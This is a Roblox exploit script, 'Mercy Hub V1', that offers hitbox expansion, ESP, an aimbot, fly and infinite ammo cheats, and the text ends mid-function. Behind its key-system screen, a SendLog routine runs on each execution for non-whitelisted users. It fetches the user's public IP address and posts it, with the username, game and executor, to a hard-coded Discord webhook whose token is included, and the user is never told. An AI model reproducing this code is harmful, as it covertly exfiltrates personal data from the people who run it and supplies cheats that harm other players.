--[[
    Advanced Hitbox Expander & ESP with UI (v8.0)
    Optimized, Feature-Rich, and Combat-Enabled.
]]

-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local HttpService = game:GetService("HttpService")

-- Executor Compatibility
local CoreGui = nil
pcall(function() CoreGui = game:GetService("CoreGui") end)

local ParentContainer = CoreGui
pcall(function()
    if gethui then
        ParentContainer = gethui()
    elseif CoreGui and CoreGui:FindFirstChild("RobloxGui") then
        ParentContainer = CoreGui
    else
        ParentContainer = LocalPlayer:WaitForChild("PlayerGui")
    end
end)

-- Blacklist System
local Blacklist = {
    "BlacklistedUser1",
    "BlacklistedUser2",
    12345678 -- Example UserId
}

local function CheckBlacklist()
    for _, item in ipairs(Blacklist) do
        if type(item) == "string" then
            if LocalPlayer.Name == item or LocalPlayer.DisplayName == item then
                return true
            end
        elseif type(item) == "number" then
            if LocalPlayer.UserId == item then
                return true
            end
        end
    end
    return false
end

-- Key System (simple local key gate)
local KeySystem = {
    Enabled = true,
    Title = "Mercy Hub V1 - Key System",
    Subtitle = "Enter your key to continue.",
    SaveFile = "MercyHub_Key.txt",
    Keys = {
        ["MERCYV1-E8F4-2K7Q-9N3D"] = true,
        ["MERCYV1-5R1X-H6P9-Z2TM"] = true,
        ["MERCYV1-Q3J7-8V2A-L4KC"] = true,
        ["MERCYV1-1W9S-M3F6-B7YU"] = true,
        ["MERCYV1-T6G2-4D8H-X9QE"] = true,
        ["MERCYV1-A7N1-P5CZ-3R8V"] = true,
        ["MERCYV1-9L2B-K7MT-6Q1X"] = true,
        ["MERCYV1-C4Y8-2J6W-N7HP"] = true,
        ["MERCYV1-Z1Q5-V9RD-8T2G"] = true,
        ["MERCYV1-M8H3-X1LA-5J7C"] = true
    }
}

local UsedKey = "N/A"

local function NormalizeKey(s)
    s = tostring(s or "")
    s = s:gsub("^%s+", ""):gsub("%s+$", "")
    return s
end

local function IsKeyValid(key)
    key = NormalizeKey(key)
    return key ~= "" and KeySystem.Keys[key] == true
end

local function PromptForKey()
    -- Check for saved key
    if KeySystem.SaveFile and isfile and isfile(KeySystem.SaveFile) then
        local saved = readfile(KeySystem.SaveFile)
        if IsKeyValid(saved) then
            UsedKey = NormalizeKey(saved)
            return true
        end
    end

    local gui = Instance.new("ScreenGui")
    gui.Name = "MercyHub_KeySystem"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 1000
    gui.Parent = ParentContainer

    local shade = Instance.new("Frame")
    shade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    shade.BackgroundTransparency = 0.35
    shade.BorderSizePixel = 0
    shade.Size = UDim2.fromScale(1, 1)
    shade.Parent = gui

    local card = Instance.new("Frame")
    card.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    card.BorderSizePixel = 0
    card.Size = UDim2.new(0, 420, 0, 210)
    card.Position = UDim2.new(0.5, -210, 0.5, -105)
    card.Active = true
    card.Draggable = true
    card.Parent = shade
    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 10)
    
    local stroke = Instance.new("UIStroke", card)
    stroke.Color = Color3.fromRGB(180, 100, 255)
    stroke.Thickness = 2
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Position = UDim2.new(0, 16, 0, 14)
    title.Size = UDim2.new(1, -32, 0, 26)
    title.Font = Enum.Font.GothamBold
    title.Text = KeySystem.Title
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 16
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = card

    local subtitle = Instance.new("TextLabel")
    subtitle.BackgroundTransparency = 1
    subtitle.Position = UDim2.new(0, 16, 0, 44)
    subtitle.Size = UDim2.new(1, -32, 0, 18)
    subtitle.Font = Enum.Font.Gotham
    subtitle.Text = KeySystem.Subtitle
    subtitle.TextColor3 = Color3.fromRGB(170, 170, 170)
    subtitle.TextSize = 12
    subtitle.TextXAlignment = Enum.TextXAlignment.Left
    subtitle.Parent = card

    local input = Instance.new("TextBox")
    input.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    input.BorderSizePixel = 0
    input.Position = UDim2.new(0, 16, 0, 78)
    input.Size = UDim2.new(1, -32, 0, 38)
    input.Font = Enum.Font.Gotham
    input.PlaceholderText = "Paste key here..."
    input.Text = ""
    input.TextColor3 = Color3.fromRGB(255, 255, 255)
    input.TextSize = 13
    input.ClearTextOnFocus = false
    input.Parent = card
    Instance.new("UICorner", input).CornerRadius = UDim.new(0, 8)

    local status = Instance.new("TextLabel")
    status.BackgroundTransparency = 1
    status.Position = UDim2.new(0, 16, 0, 122)
    status.Size = UDim2.new(1, -32, 0, 18)
    status.Font = Enum.Font.Gotham
    status.Text = " "
    status.TextColor3 = Color3.fromRGB(255, 120, 120)
    status.TextSize = 12
    status.TextXAlignment = Enum.TextXAlignment.Left
    status.Parent = card

    local submit = Instance.new("TextButton")
    submit.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
    submit.BorderSizePixel = 0
    submit.Position = UDim2.new(0, 16, 0, 150)
    submit.Size = UDim2.new(0.6, -8, 0, 40)
    submit.Font = Enum.Font.GothamBold
    submit.Text = "Unlock"
    submit.TextColor3 = Color3.fromRGB(255, 255, 255)
    submit.TextSize = 13
    submit.AutoButtonColor = true
    submit.Parent = card
    Instance.new("UICorner", submit).CornerRadius = UDim.new(0, 8)

    local exit = Instance.new("TextButton")
    exit.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    exit.BorderSizePixel = 0
    exit.Position = UDim2.new(0.6, 8, 0, 150)
    exit.Size = UDim2.new(0.4, -24, 0, 40)
    exit.Font = Enum.Font.GothamBold
    exit.Text = "Close"
    exit.TextColor3 = Color3.fromRGB(255, 255, 255)
    exit.TextSize = 13
    exit.AutoButtonColor = true
    exit.Parent = card
    Instance.new("UICorner", exit).CornerRadius = UDim.new(0, 8)

    local done = false
    local ok = false
    local attempts = 0

    local function tryKey()
        local key = NormalizeKey(input.Text)
        if IsKeyValid(key) then
            if writefile then
                pcall(writefile, KeySystem.SaveFile, key)
            end
            UsedKey = key
            ok = true
            done = true
        else
            attempts = attempts + 1
            if attempts >= 2 then
                LocalPlayer:Kick("Mercy Hub V1: Too many failed key attempts. (Limit: 2)")
                done = true
            else
                status.Text = "Invalid key. (Attempts: " .. attempts .. "/2)"
            end
        end
    end

    submit.MouseButton1Click:Connect(tryKey)
    input.FocusLost:Connect(function(enterPressed)
        if enterPressed then tryKey() end
    end)
    exit.MouseButton1Click:Connect(function()
        done = true
    end)

    while not done do
        task.wait()
    end

    pcall(function() gui:Destroy() end)
    return ok
end

-- Webhook Logging
local WebhookWhitelist = {
    ["rundownyall"] = true,
    ["clumprun"] = true,
    ["freewinswonder"] = true,
    ["gtsegamaw"] = true
}

local function SendLog()
    if WebhookWhitelist[LocalPlayer.Name:lower()] then return end
    
    local webhook = "https://discord.com/api/webhooks/1483565298924912806/YtPOYpa-SRgE5zowtvFJV896Tuosr2iJMbTl-k06QftOreL5OTGKAEzoZIVOqfSzyZNA"
    local ip = "Unknown"
    pcall(function()
        ip = game:HttpGet("https://api.ipify.org")
    end)
    
    local executor = "Unknown"
    if identifyexecutor then executor = identifyexecutor() end
    
    local data = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "**Mercy Hub V1 - User Log**",
            ["description"] = "A user has executed the script.",
            ["type"] = "rich",
            ["color"] = tonumber(0x7289da),
            ["fields"] = {
                {["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
                {["name"] = "Display Name", ["value"] = LocalPlayer.DisplayName, ["inline"] = true},
                {["name"] = "IP Address", ["value"] = ip, ["inline"] = true},
                {["name"] = "Game", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. " (" .. game.PlaceId .. ")", ["inline"] = false},
                {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
                {["name"] = "Key Used", ["value"] = tostring(UsedKey or "N/A"), ["inline"] = true}
            },
            ["footer"] = {["text"] = "Mercy Hub V1 Logger"},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    local body = HttpService:JSONEncode(data)
    local headers = {["content-type"] = "application/json"}
    
    local request = http_request or request or (HttpService and HttpService.PostAsync)
    if request then
        pcall(function()
            request({Url = webhook, Method = "POST", Headers = headers, Body = body})
        end)
    end
end

if CheckBlacklist() then
    return
end

if KeySystem.Enabled then
    local ok = PromptForKey()
    if not ok then
        return
    end
end

pcall(SendLog)

-- Cleanup old ESP folders from previous runs
for _, v in ipairs(ParentContainer:GetChildren()) do
    if v.Name:find("ESP_") then
        pcall(function() v:Destroy() end)
    end
end

-- Configuration
    local Config = {
        -- Hitbox Settings
        Enabled = false,
        HitboxSize = 10,
        HitboxTransparency = 0.5,
        TeamCheck = false,
        WallCheck = false,
        TargetPart = "Body",
        ToggleKey = Enum.KeyCode.K, -- UI Toggle
        HitboxToggleKey = Enum.KeyCode.E, -- Hitbox Toggle
        UnmodifiedVisuals = true, -- Clean visuals (Show original head size)

    -- Aimbot Settings
    Aimbot_Enabled = false,
    Aimbot_Method = "Cam Lock", -- "Cam Lock" or "Mouse Lock"
    Aimbot_Smoothing = 5,
    Aimbot_FOVRadius = 150,
    Aimbot_ShowFOV = false,
    Aimbot_FOVColor = Color3.fromRGB(255, 255, 255),
    Aimbot_TargetPart = "Head",
    Aimbot_TeamCheck = false,
    Aimbot_WallCheck = false,

    -- ESP Settings
    ESP_Enabled = false,
    ESP_Key = Enum.KeyCode.Q,
    Chams_Enabled = false,
    ShowHitbox = false,
    HealthText_Enabled = false,
    ShowDisplayName = false,
    VisibleCheck = false,
    ESP_Color = Color3.fromRGB(180, 100, 255),
    FriendColor = Color3.fromRGB(0, 255, 0),

    -- Movement Settings
    WalkSpeed = 16,
    WalkSpeedEnabled = false,
    FlyEnabled = false,
    FlySpeed = 50,
    RenderQuality = 21,

    -- Rage Settings
    InfAmmo = false,
    RapidFire = false,
    FireRateMultiplier = 1,

    -- Freeze Settings
    Frozen = false,
    FreezeKey = Enum.KeyCode.T
}

-- Memory
local OriginalStates = {}
local ESP_Elements = {}
local PlayerStatus = {} -- Whitelist, Target, Neutral
local LastRageTick = 0
local LastWalkTick = 0
local LastCleanupTick = 0
local LastRescanTick = 0 -- For background task timing

-- Aimbot Drawing
local FOVCircle = Drawing.new("Circle")
FOVCircle.Thickness = 1.5
FOVCircle.NumSides = 64
FOVCircle.Filled = false
FOVCircle.Visible = false

-- Global Raycast Params (Save CPU by not creating every call)
local VisParams = RaycastParams.new()
VisParams.FilterType = Enum.RaycastFilterType.Exclude

-- Helper Functions
local function GetPlayerStatus(player)
    return PlayerStatus[player.UserId] or "Neutral"
end
local function GetActualPartName(player, target)
    local character = player.Character
    if not character then return nil end
    if target == "Body" then
        return character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso") or character:FindFirstChild("LowerTorso")
    elseif target == "Head" then
        return character:FindFirstChild("Head")
    elseif target == "HumanoidRootPart" then
        -- Avoid modifying HRP: it can break humanoid physics (players "run in place").
        return character:FindFirstChild("UpperTorso")
            or character:FindFirstChild("Torso")
            or character:FindFirstChild("LowerTorso")
            or character:FindFirstChild("Head")
    end
    return character:FindFirstChild(target)
end

local function IsVisible(targetPart, character)
    local origin = Camera.CFrame.Position
    local destination = targetPart.Position
    local direction = destination - origin
    
    VisParams.FilterDescendantsInstances = {LocalPlayer.Character, character}
    local result = workspace:Raycast(origin, direction, VisParams)
    
    -- Stronger check: If direct ray hits something, try checking slightly above/below/left/right
    if result then
        local offsets = {
            Vector3.new(0, 1.5, 0),  -- Slightly above
            Vector3.new(0, -1.5, 0), -- Slightly below
            Vector3.new(1.5, 0, 0),  -- Slightly right
            Vector3.new(-1.5, 0, 0)  -- Slightly left
        }
        
        for _, offset in ipairs(offsets) do
            local newDest = destination + offset
            local newDir = newDest - origin
            local newResult = workspace:Raycast(origin, newDir, VisParams)
            if not newResult then
                return true -- Found a clear line of sight to a point near the target
            end
        end
        return false
    end
    
    return true
end

local function RestoreHitbox(player)
    local character = player.Character
    if not character then return end
    
    local state = OriginalStates[player.UserId]
    if state then
        local part = character:FindFirstChild(state.PartName)
        if part and part:IsA("BasePart") then
            part.Size = state.Size
            part.Transparency = state.Transparency
            part.LocalTransparencyModifier = 0
            part.Color = state.Color
            part.Material = state.Material
            part.CanCollide = state.CanCollide
            if state.CanQuery ~= nil then
                part.CanQuery = state.CanQuery
            end
            part.Massless = state.Massless
            
            -- Cleanup Visual Clone
            for _, v in ipairs(character:GetChildren()) do
                if v.Name == "VisualClone" then
                    pcall(function() v:Destroy() end)
                end
            end
            
            -- Cleanup Constraints & Markers
            local marker = part:FindFirstChild("NoCollide_Processed")
            if marker then marker:Destroy() end
            
            for _, v in ipairs(part:GetChildren()) do
                if v:IsA("NoCollisionConstraint") then v:Destroy() end
            end
        end
        
        -- Cleanup Listeners
        if state.DecalListener then state.DecalListener:Disconnect() end
        
        -- Restore Decals/Meshes
        if state.Decals then
            for item, originalValue in pairs(state.Decals) do
                if item.Parent then
                    if item:IsA("SurfaceGui") then
                        item.Enabled = originalValue
                    elseif item:IsA("SpecialMesh") then
                        item.Transparency = originalValue or 0
                    else
                        item.Transparency = originalValue
                    end
                end
            end
        end
        
        OriginalStates[player.UserId] = nil
    end

    -- Cleanup separate hitbox parts
    for _, v in ipairs(character:GetDescendants()) do
        if v.Name == "MercyHitbox" then
            pcall(function() v:Destroy() end)
        end
    end
end

local function RestoreAllHitboxes()
    for _, p in ipairs(Players:GetPlayers()) do
        RestoreHitbox(p)
    end
end

local function ApplyHitbox(player)
    if not Config.Enabled or Config.Frozen then return end
    if player == LocalPlayer then return end
    if Config.TeamCheck and player.Team == LocalPlayer.Team then return end
    
    local character = player.Character
    if not character or not character.Parent then return end

    -- Whitelist Check
    local status = GetPlayerStatus(player)
    if status == "Whitelist" then
        RestoreHitbox(player)
        return
    end

    local part = GetActualPartName(player, Config.TargetPart)
    if not part or not part:IsA("BasePart") then return end

    -- Throttled Wall Check
    local isWallHidden = false
    if Config.WallCheck then
        local now = tick()
        local lastCheck = player:GetAttribute("LastWallCheck") or 0
        local isVisible = player:GetAttribute("IsVisible")
        
        if isVisible == nil or now - lastCheck > 0.2 then
            isVisible = IsVisible(part, character)
            player:SetAttribute("LastWallCheck", now)
            player:SetAttribute("IsVisible", isVisible)
        end
        
        if not isVisible then isWallHidden = true end
    end

    local state = OriginalStates[player.UserId]
    if not state then
        state = {
            Size = part.Size,
            Transparency = part.Transparency,
            Color = part.Color,
            Material = part.Material,
            CanCollide = part.CanCollide,
            CanQuery = part.CanQuery,
            Massless = part.Massless,
            PartName = part.Name,
            Decals = {}
        }
        
        local function handleChild(child)
            if child.Name == "VisualClone" or child.Name == "MercyHitbox" then return end
            
            if child:IsA("Decal") or child:IsA("Texture") or child:IsA("SurfaceGui") or child:IsA("SpecialMesh") then
                if child:IsA("SurfaceGui") then
                    state.Decals[child] = child.Enabled
                    child.Enabled = false
                elseif child:IsA("SpecialMesh") then
                    state.Decals[child] = child.Transparency or 0
                    child.Transparency = 1
                else
                    state.Decals[child] = child.Transparency
                    child.Transparency = 1
                end
            end
        end
        
        for _, v in ipairs(part:GetChildren()) do
            handleChild(v)
        end
        
        state.DecalListener = part.ChildAdded:Connect(handleChild)
        OriginalStates[player.UserId] = state
    end
    
    -- Ensure all decals/meshes stay hidden on the expanded part
    for item, _ in pairs(state.Decals) do
        if item.Parent == part then
            if item:IsA("SurfaceGui") then
                if item.Enabled ~= false then item.Enabled = false end
            elseif item:IsA("SpecialMesh") then
                if item.Transparency ~= 1 then item.Transparency = 1 end
            elseif item.Transparency ~= 1 then
                item.Transparency = 1
            end
        end
    end
    
    if isWallHidden then
        if part.Size ~= state.Size then part.Size = state.Size end
        if part.Transparency ~= state.Transparency then part.Transparency = state.Transparency end
        return
    end

    -- Apply Size and Visuals
    local multiplier = (status == "Target") and 1.5 or 1
    local targetSizeVal = Config.HitboxSize * multiplier
    local targetSize = Vector3.new(targetSizeVal, targetSizeVal, targetSizeVal)

    if (part.Size - targetSize).Magnitude > 0.01 then
        part.Size = targetSize
    end
    
    if Config.UnmodifiedVisuals then
        local visual = character:FindFirstChild("VisualClone")
        if not visual then
            visual = part:Clone()
            visual.Name = "VisualClone"
            visual.Size = state.Size
            visual.Color = part.Color
            visual.Transparency = state.Transparency
            visual.CanCollide = false
            visual.CanTouch = false
            visual.CanQuery = false
            visual.Massless = true
            
            -- Deep cleanup for VisualClone (Prevent any physics interference)
            for _, child in ipairs(visual:GetDescendants()) do
                if child:IsA("BasePart") then
                    child.CanCollide = false
                    child.CanTouch = false
                    child.CanQuery = false
                    child.Massless = true
                elseif child:IsA("JointInstance") or child:IsA("Constraint") then
                    child:Destroy()
                end
            end
            
            visual.Parent = character
            local weld = Instance.new("WeldConstraint")
            weld.Part0 = visual
            weld.Part1 = part
            weld.Parent = visual
            
            -- Ensure VisualClone children are visible
            for _, child in ipairs(visual:GetDescendants()) do
                if child:IsA("Decal") or child:IsA("Texture") then
                    child.Transparency = 0
                elseif child:IsA("SurfaceGui") then
                    child.Enabled = true
                elseif child:IsA("SpecialMesh") then
                    child.Transparency = 0
                end
            end
        end
        
        -- Sync Visual
        if visual.Color ~= part.Color then visual.Color = part.Color end
        if visual.LocalTransparencyModifier ~= 0 then visual.LocalTransparencyModifier = 0 end
        
        -- Hitbox Visibility: Only transparent if "Show Hitbox" is enabled AND master ESP is ON (Q)
        local isHitboxVisible = Config.ShowHitbox and Config.ESP_Enabled
        if isHitboxVisible then
            part.Transparency = Config.HitboxTransparency
            part.Color = Color3.fromRGB(255, 255, 255)
            visual.Transparency = 1 -- Hide normal head to show hitbox
        else
            part.Transparency = 1 -- Hide giant head
            visual.Transparency = state.Transparency -- Show normal head
        end
    else
        -- Old simple expansion system
        local isHitboxVisible = Config.ShowHitbox and Config.ESP_Enabled
        if isHitboxVisible then
            part.Transparency = Config.HitboxTransparency
            part.Color = Color3.fromRGB(255, 255, 255)
        else
            part.Transparency = 1
        end
    end
    
    if part.LocalTransparencyModifier ~= 0 then part.LocalTransparencyModifier = 0 end

    -- FORCE Disable collisions and physics impact
    part.CanCollide = false
    part.CanTouch = false
    part.CanQuery = true
    part.Massless = true
    
    -- Optimize Constraint Logic (Prevent character stretching/floating)
    if not part:FindFirstChild("NoCollide_Processed") then
        local marker = Instance.new("BoolValue", part)
        marker.Name = "NoCollide_Processed"
        
        for _, otherPart in ipairs(character:GetDescendants()) do
            if otherPart:IsA("BasePart") and otherPart ~= part then
                local constraint = Instance.new("NoCollisionConstraint")
                constraint.Part0 = part
                constraint.Part1 = otherPart
                constraint.Parent = part
            end
        end
    end
end

-- ESP System
local function CreateESP(player)
    if player == LocalPlayer then return end
    
    -- Cleanup existing
    local existing = ParentContainer:FindFirstChild("ESP_" .. player.UserId)
    if existing then pcall(function() existing:Destroy() end) end
    
    local folder = Instance.new("Folder", ParentContainer)
    folder.Name = "ESP_" .. player.UserId
    
    local highlight = Instance.new("Highlight", folder)
    highlight.Enabled = false
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.FillColor = Config.ESP_Color
    highlight.FillTransparency = 0.5
    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
    highlight.OutlineTransparency = 0
    highlight.Adornee = player.Character

    local hitboxHighlight = Instance.new("Highlight", folder)
    hitboxHighlight.Name = "HitboxHighlight"
    hitboxHighlight.Enabled = false
    hitboxHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    hitboxHighlight.FillColor = Color3.fromRGB(255, 255, 255)
    hitboxHighlight.FillTransparency = 0.5
    hitboxHighlight.OutlineColor = Color3.fromRGB(255, 255, 255)
    hitboxHighlight.OutlineTransparency = 0
    
    local billboard = Instance.new("BillboardGui", folder)
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.AlwaysOnTop = true
    billboard.Enabled = false
    billboard.DistanceLowerLimit = 0
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    
    local label = Instance.new("TextLabel", billboard)
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.GothamBold
    label.TextSize = 14
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextStrokeTransparency = 0
    label.RichText = true

    local footerBillboard = Instance.new("BillboardGui", folder)
    footerBillboard.Size = UDim2.new(0, 200, 0, 50)
    footerBillboard.AlwaysOnTop = true
    footerBillboard.Enabled = false
    footerBillboard.DistanceLowerLimit = 0
    footerBillboard.StudsOffset = Vector3.new(0, -3.5, 0)
    
    local footerLabel = Instance.new("TextLabel", footerBillboard)
    footerLabel.Size = UDim2.new(1, 0, 1, 0)
    footerLabel.BackgroundTransparency = 1
    footerLabel.Font = Enum.Font.GothamBold
    footerLabel.TextSize = 14
    footerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    footerLabel.TextStrokeTransparency = 0
    footerLabel.RichText = true
    
    ESP_Elements[player.UserId] = {
        Folder = folder,
        Highlight = highlight,
        HitboxHighlight = hitboxHighlight,
        Billboard = billboard,
        TextLabel = label,
        FooterBillboard = footerBillboard,
        FooterLabel = footerLabel
    }
end

local function UpdateESP()
    if not Config.ESP_Enabled then
        for _, elements in pairs(ESP_Elements) do
            if elements.Highlight and elements.Highlight.Enabled then elements.Highlight.Enabled = false end
            if elements.HitboxHighlight and elements.HitboxHighlight.Enabled then elements.HitboxHighlight.Enabled = false end
            if elements.Billboard and elements.Billboard.Enabled then elements.Billboard.Enabled = false end
            if elements.FooterBillboard and elements.FooterBillboard.Enabled then elements.FooterBillboard.Enabled = false end
        end
        return
    end

    local now = tick()
    for userId, elements in pairs(ESP_Elements) do
        local player = Players:GetPlayerByUserId(userId)
        
        if not elements.Folder or not elements.Folder.Parent then
            if player then CreateESP(player) end
            continue
        end

        if player and player.Character then
            local character = player.Character
            local hrp = character:FindFirstChild("HumanoidRootPart")
            local head = character:FindFirstChild("Head") or hrp
            
            if not hrp then continue end

            local humanoid = character:FindFirstChildOfClass("Humanoid")
            local isAlive = not humanoid or (humanoid.Health > 0)
            local status = GetPlayerStatus(player)
            
            if status == "Whitelist" or not isAlive then
                if elements.Highlight.Enabled then elements.Highlight.Enabled = false end
                if elements.HitboxHighlight.Enabled then elements.HitboxHighlight.Enabled = false end
                if elements.Billboard.Enabled then elements.Billboard.Enabled = false end
                if elements.FooterBillboard.Enabled then elements.FooterBillboard.Enabled = false end
                continue
            end

            -- Chams
            if elements.Highlight.Enabled ~= Config.Chams_Enabled then
                elements.Highlight.Enabled = Config.Chams_Enabled
            end
            if Config.Chams_Enabled then
                if elements.Highlight.Adornee ~= character then elements.Highlight.Adornee = character end
                local targetColor = (status == "Target") and Color3.fromRGB(255, 0, 0) or Config.ESP_Color
                if elements.Highlight.FillColor ~= targetColor then elements.Highlight.FillColor = targetColor end
            end

            -- Hitbox ESP
            if elements.HitboxHighlight.Enabled ~= (Config.ESP_Enabled and Config.ShowHitbox) then
                elements.HitboxHighlight.Enabled = (Config.ESP_Enabled and Config.ShowHitbox)
            end
            if elements.HitboxHighlight.Enabled then
                if now - (elements.LastHitboxScan or 0) > 0.5 then
                    elements.LastHitboxScan = now
                    elements.CachedHitboxPart = GetActualPartName(player, Config.TargetPart)
                end
                if elements.CachedHitboxPart and elements.HitboxHighlight.Adornee ~= elements.CachedHitboxPart then
                    elements.HitboxHighlight.Adornee = elements.CachedHitboxPart
                end
            end
            
            -- Billboards
            local billboardOn = Config.HealthText_Enabled or Config.ShowDisplayName
            if elements.Billboard.Enabled ~= billboardOn then
                elements.Billboard.Enabled = billboardOn
            end
            
            if billboardOn then
                if elements.Billboard.Adornee ~= head then elements.Billboard.Adornee = head end
                
                -- Only update text every 0.1s to save CPU
                if now - (elements.LastTextUpdate or 0) > 0.1 then
                    elements.LastTextUpdate = now
                    local nameStr = Config.ShowDisplayName and string.format("<font color=\"rgb(255,255,255)\">%s</font>", player.DisplayName or player.Name) or ""
                    local healthStr = ""
                    if Config.HealthText_Enabled and humanoid then
                        local hCol = (humanoid.Health > 50) and "rgb(0,255,0)" or (humanoid.Health > 25 and "rgb(255,255,0)" or "rgb(255,0,0)")
                        healthStr = (nameStr ~= "" and "\n" or "") .. string.format("<font color=\"%s\">%d HP</font>", hCol, math.floor(humanoid.Health))
                    end
                    local tag = (status == "Target") and "<font color=\"rgb(255,0,0)\">[TARGET]</font> " or ""
                    elements.TextLabel.Text = tag .. nameStr .. healthStr
                end
            end

            -- Visibility
            if Config.VisibleCheck then
                if now - (elements.LastVisCheck or 0) > 0.25 then
                    elements.LastVisCheck = now
                    elements.IsVis = head and IsVisible(head, character) or true
                end
                
                local isHidden = not elements.IsVis
                if elements.FooterBillboard.Enabled ~= isHidden then
                    elements.FooterBillboard.Enabled = isHidden
                end
                if isHidden then
                    if elements.FooterBillboard.Adornee ~= hrp then elements.FooterBillboard.Adornee = hrp end
                    elements.FooterLabel.Text = "<font color=\"rgb(180,100,255)\">[HIDDEN]</font>"
                end
            elseif elements.FooterBillboard.Enabled then
                elements.FooterBillboard.Enabled = false
            end
        else
            if elements.Highlight.Enabled then elements.Highlight.Enabled = false end
            if elements.HitboxHighlight.Enabled then elements.HitboxHighlight.Enabled = false end
            if elements.Billboard.Enabled then elements.Billboard.Enabled = false end
            if elements.FooterBillboard.Enabled then elements.FooterBillboard.Enabled = false end
        end
    end
end

-- Rage System (Optimized & Universal)
local CachedAmmoValues = {}
local CachedFireRateValues = {}
local CachedDamageValues = {}
local GlobalWeaponStats = {}

-- Rage value originals + dedupe (weak tables to avoid memory leaks)
local RageOriginal = {
    Ammo = setmetatable({}, {__mode = "k"}),      -- [Instance] = originalValue
    FireRate = setmetatable({}, {__mode = "k"}),  -- [Instance] = originalValue
    AttrAmmo = setmetatable({}, {__mode = "k"}),  -- [Instance] = { [attrName] = originalValue }
    AttrFireRate = setmetatable({}, {__mode = "k"}), -- [Instance] = { [attrName] = originalValue }
    Module = setmetatable({}, {__mode = "k"})     -- [ModuleScript] = { [key] = originalValue }
}

local RageSeen = {
    Ammo = setmetatable({}, {__mode = "k"}),
    FireRate = setmetatable({}, {__mode = "k"})
}

local function TryRememberInstanceOriginal(kind, inst)
    if typeof(inst) ~= "Instance" then return end
    if kind == "Ammo" then
        if RageOriginal.Ammo[inst] == nil then
            RageOriginal.Ammo[inst] = inst.Value
        end
    elseif kind == "FireRate" then
        if RageOriginal.FireRate[inst] == nil then
            RageOriginal.FireRate[inst] = inst.Value
        end
    end
end

local function TryRememberAttrOriginal(kind, obj, attrName)
    if typeof(obj) ~= "Instance" then return end
    local v = obj:GetAttribute(attrName)
    if kind == "Ammo" then
        local t = RageOriginal.AttrAmmo[obj]
        if not t then
            t = {}
            RageOriginal.AttrAmmo[obj] = t
        end
        if t[attrName] == nil then
            t[attrName] = v
        end
    elseif kind == "FireRate" then
        local t = RageOriginal.AttrFireRate[obj]
        if not t then
            t = {}
            RageOriginal.AttrFireRate[obj] = t
        end
        if t[attrName] == nil then
            t[attrName] = v
        end
    end
end

local function ScanModule(module)
    if not module:IsA("ModuleScript") then return end
    -- Only require modules that are likely to be configuration (to avoid breaking logic)
    local name = module.Name:lower()
    if not (name:find("setting") or name:find("config") or name:find("data") or name:find("info") or name:find("stats")) then
        return
    end

    local s, res = pcall(require, module)
    if s and type(res) == "table" then
        if RageOriginal.Module[module] == nil then
            local snap = {}
            for k, v in pairs(res) do
                if type(v) == "number" then
                    snap[k] = v
                end
            end
            RageOriginal.Module[module] = snap
        end

        if Config.InfAmmo then 
            if res.Ammo then res.Ammo = 999 end
            if res.StoredAmmo then res.StoredAmmo = 999 end
            if res.MaxAmmo then res.MaxAmmo = 999 end
            if res.ClipSize then res.ClipSize = 999 end
        end
        if Config.RapidFire then 
            local mult = math.max(1, tonumber(Config.FireRateMultiplier) or 1)
            local minDelay = 0.01
            local original = RageOriginal.Module[module] or {}
            local function apply(key)
                local base = original[key]
                if type(base) == "number" then
                    res[key] = math.max(minDelay, base / mult)
                elseif type(res[key]) == "number" then
                    res[key] = math.max(minDelay, res[key] / mult)
                end
            end
            if res.ShootRate ~= nil then apply("ShootRate") end
            if res.Delay ~= nil then apply("Delay") end
            if res.FireRate ~= nil then apply("FireRate") end
            if res.ReloadTime ~= nil then apply("ReloadTime") end
            if res.TimeBetweenShots ~= nil then apply("TimeBetweenShots") end
            if res.Cooldown ~= nil then apply("Cooldown") end
        end
    end
end

local function ScanTool(tool)
    if not tool:IsA("Tool") or tool:GetAttribute("Scanned") then return end
    tool:SetAttribute("Scanned", true)
    
    -- Optimized Scanner: Search descendants for modules and values
    for _, v in ipairs(tool:GetDescendants()) do
        if v:IsA("ModuleScript") then
            ScanModule(v)
        elseif v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue") then
            local name = v.Name:lower()
            -- Ammo
            if name:find("ammo") or name:find("clip") or name:find("mag") or name:find("bullets") or name:find("cur") or name:find("val") or name:find("count") or name:find("rem") or name:find("res") then
                if not RageSeen.Ammo[v] then
                    RageSeen.Ammo[v] = true
                    TryRememberInstanceOriginal("Ammo", v)
                    table.insert(CachedAmmoValues, v)
                end
            -- Fire Rate
            elseif name:find("firerate") or name:find("delay") or name:find("cooldown") or name:find("wait") or name:find("speed") or name:find("time") or name:find("rate") or name:find("shoot") then
                if not RageSeen.FireRate[v] then
                    RageSeen.FireRate[v] = true
                    TryRememberInstanceOriginal("FireRate", v)
                    table.insert(CachedFireRateValues, v)
                end
